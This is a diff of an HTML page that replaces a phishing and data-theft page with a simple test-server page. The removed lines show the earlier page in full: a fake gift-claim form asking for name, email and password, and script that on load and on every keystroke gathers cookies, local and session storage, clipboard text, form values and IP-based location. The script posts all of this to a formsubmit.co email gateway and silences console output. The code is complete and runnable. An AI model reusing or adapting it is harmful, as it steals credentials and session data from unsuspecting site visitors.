@@ -1,112 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading... Please Wait</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #0f0; }
-        h1 { color: #0f0; }
-    </style>
+    <title>Test Server</title>
 </head>
 <body>
-    <h1>Welcome! Just a moment...</h1>
-    <p>Initializing secure session...</p>
-
-    <!-- Fake content - change this to whatever lure you want -->
-    <div id="fakecontent">
-        <h2>Claim your free gift!</h2>
-        <p>Enter details to continue...</p>
-        <form id="dummyform">
-            <input type="text" id="name" placeholder="Full Name" required><br><br>
-            <input type="email" id="email" placeholder="Email" required><br><br>
-            <input type="password" id="pass" placeholder="Password" required><br><br>
-            <button type="submit">Claim Now</button>
-        </form>
-    </div>
+    <h1>My Test Server</h1>
+    <button onclick="sendRequest()">Send Request</button>
+    <p id="result"></p>
 
     <script>
-        // === DATA STEALER ENGINE ===
-        function stealAndSend() {
-            let stolen = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage.getItem(key); return obj; }, {})),
-                sessionStorage: JSON.stringify(Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage.getItem(key); return obj; }, {})),
-                screen: `\( {screen.width}x \){screen.height}`,
-                referrer: document.referrer,
-                ip: null,
-                location: null,
-                clipboard: null,
-                formData: {}
-            };
-
-            // Steal form data (including fake form above)
-            document.querySelectorAll('input, textarea, select').forEach(el => {
-                if (el.value) stolen.formData[el.id || el.name || el.placeholder] = el.value;
-            });
-
-            // Try to get clipboard
-            navigator.clipboard.readText().then(text => {
-                stolen.clipboard = text;
-            }).catch(() => {});
-
-            // Get public IP and approximate location
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
+        function sendRequest() {
+            fetch('/api/test')
+                .then(res => res.text())
                 .then(data => {
-                    stolen.ip = data.ip;
-                    stolen.location = `${data.city}, ${data.region}, ${data.country}`;
-                    sendToEmail(stolen);
+                    document.getElementById('result').innerText = data;
                 })
-                .catch(() => sendToEmail(stolen)); // fallback if blocked
-        }
-
-        function sendToEmail(data) {
-            const emailGateway = "https://formsubmit.co/voidcraftggs.business@gmail.com"; // Your Gmail here
-
-            fetch(emailGateway, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    _subject: "💀 New Victim Data - " + (data.ip || "Unknown IP"),
-                    _template: "table",
-                    "Stolen Data": JSON.stringify(data, null, 2),
-                    "Raw JSON": JSON.stringify(data)
-                })
-            }).then(() => {
-                console.log("%cData sent successfully to voidcraftggs.business@gmail.com", "color: lime; font-size: 16px");
-            }).catch(err => console.log("Send error:", err));
-        }
-
-        // Trigger on load + every form interaction
-        window.onload = () => {
-            stealAndSend();
-            
-            // Extra triggers
-            document.addEventListener('input', () => stealAndSend());
-            document.addEventListener('submit', (e) => {
-                e.preventDefault();
-                stealAndSend();
-                alert("Claim successful! 🎉 (fake message)");
-            });
-
-            // Try geolocation
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let loc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                    // You can send again with location if you want
-                    console.log("Geo stolen:", loc);
+                .catch(err => {
+                    document.getElementById('result').innerText = "Error: " + err;
                 });
-            }
-        };
-
-        // Stealth mode: hide console errors
-        console.log = () => {};
+        }
     </script>
 </body>
 </html>
